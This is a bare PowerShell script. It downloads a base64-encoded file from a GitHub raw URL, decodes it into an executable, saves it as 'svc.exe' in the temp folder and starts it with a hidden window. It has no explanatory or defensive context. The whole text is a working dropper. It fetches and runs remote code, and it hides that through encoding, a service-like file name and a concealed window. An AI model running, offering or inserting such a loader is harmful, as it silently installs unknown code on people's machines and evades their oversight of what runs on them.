$url='https://raw.githubusercontent.com/Dracs64/files/refs/heads/main/encoded_exe_fixed.txt'
$data=(iwr $url -UseBasicParsing).Content
$bytes=[Convert]::FromBase64String($data)
$path="$env:TEMP\svc.exe"
[IO.File]::WriteAllBytes($path,$bytes)
Start-Process $path -WindowStyle Hidden